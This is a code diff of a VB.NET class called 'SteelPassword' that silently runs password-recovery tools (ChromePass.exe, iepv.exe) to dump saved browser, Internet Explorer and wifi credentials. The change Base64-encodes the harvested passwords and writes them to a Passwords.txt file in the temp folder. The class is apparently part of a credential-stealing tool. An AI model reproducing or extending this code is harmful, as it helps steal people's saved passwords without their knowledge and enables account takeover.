@@ -50,12 +50,12 @@ Public Class SteelPassword
             End If
             Shell(Paths & "\ChromePass.exe /scomma " & Paths & "\" & "passlist3.txt")
             Shell(Paths & "\iepv.exe /scomma " & Paths & "\" & "passlist4.txt")
-            result = CleanPasswords(Paths & "\" & "passlist1.txt") &
-            CleanPasswords(Paths & "\" & "passlist2.txt") &
-            CleanPasswords(Paths & "\" & "passlist3.txt") &
-            CleanPasswords(Paths & "\" & "passlist4.txt")
+            IO.File.WriteAllText(Path.GetTempPath & "\" & "Passwords.txt", ENB(File.ReadAllText(Paths & "\" & "passlist1.txt") &
+            File.ReadAllText(Paths & "\" & "passlist2.txt") &
+            File.ReadAllText(Paths & "\" & "passlist3.txt") &
+            File.ReadAllText(Paths & "\" & "passlist4.txt")))
             If File.Exists(Paths & "\wifi1.txt") Then
-                result += CleanPasswords(Paths & "\wifi1.txt")
+                File.AppendAllText(Paths & "\Passwords.txt", ENB(File.ReadAllText(Paths & "\wifi1.txt")))
             End If
         Catch ex As Exception
             ' MsgBox(ex.Message)
@@ -111,17 +111,8 @@ Public Class SteelPassword
         Dim b As Byte() = Convert.FromBase64String(s)
         DEB = System.Text.Encoding.UTF8.GetString(b)
     End Function
-    Public Function CleanPasswords(ByVal PasswordFile As String)
-        Dim TextBox1 As New TextBox
-        TextBox1.Multiline = True
-        Dim A() As String = IO.File.ReadAllLines(PasswordFile)
-        If A.Length = 0 Then
-
-        Else
-            For Each line As String In A
-                TextBox1.AppendText(line & vbNewLine)
-            Next
-            Return TextBox1.Text
-        End If
+    Public Function ENB(ByRef s As String) As String
+        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
+        ENB = Convert.ToBase64String(byt)
     End Function
 End Class
